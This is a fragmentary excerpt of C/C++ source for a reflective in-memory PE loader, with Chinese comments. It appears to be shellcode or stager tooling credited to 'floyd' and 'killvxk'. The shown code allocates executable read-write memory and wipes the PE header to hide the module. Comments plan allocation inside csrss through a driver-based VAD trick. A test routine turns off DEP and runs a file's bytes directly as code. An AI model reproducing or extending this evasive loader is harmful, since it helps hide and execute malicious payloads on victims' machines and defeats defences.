...
#ifndef _DEBUG
DWORD WINAPI payLoad(LPVOID _param)
#else
...
start:                                      //  
	...
	//为了实现真无模块这里直接使用分配好的内存
	pMemoryAddress = (void *)(lpFileData + nImageSize);

	//修改页属性。应该根据每个页的属性单独设置其对应内存页的属性。这里简化一下。
	//统一设置成一个属性PAGE_EXECUTE_READWRITE

	//pMemoryAddress = myVirtualAlloc(NULL, nImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//unsigned long unOld;
...
#define NAME_BUF_SIZE 256
	...
	//申请内存那块也要改一下
	//申请要在csrss里用神奇驱动VAD方式

	////抹去PE头
	for (int xxx = 0; xxx < 0x1000; xxx++)
	{
		((PUCHAR)pMemoryAddress)[xxx] = 0x00;
	}
...
typedef DWORD (WINAPI *fnPaylaod)(PVOID);
...
void TestPayload()
{
	...
	if (hFile != INVALID_HANDLE_VALUE)
	{
		...
		LPVOID buf = VirtualAlloc(NULL, dwSize*5, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		DWORD dwOutSize = 0;
		ReadFile(hFile,buf,dwSize,&dwOutSize,0);

		DWORD dwFlag = 0;
		VirtualProtect(buf,dwSize*5,PAGE_EXECUTE_READWRITE,&dwFlag);

		//DEP关闭
		SetProcessDEPPolicy(2);

		((fnPaylaod)buf)(nullptr);

		MessageBox(nullptr, L"OK GO", nullptr, MB_OK);
...
void Usage()
{
	...
	printf("Make by floyd modify by killvxk\n");
}
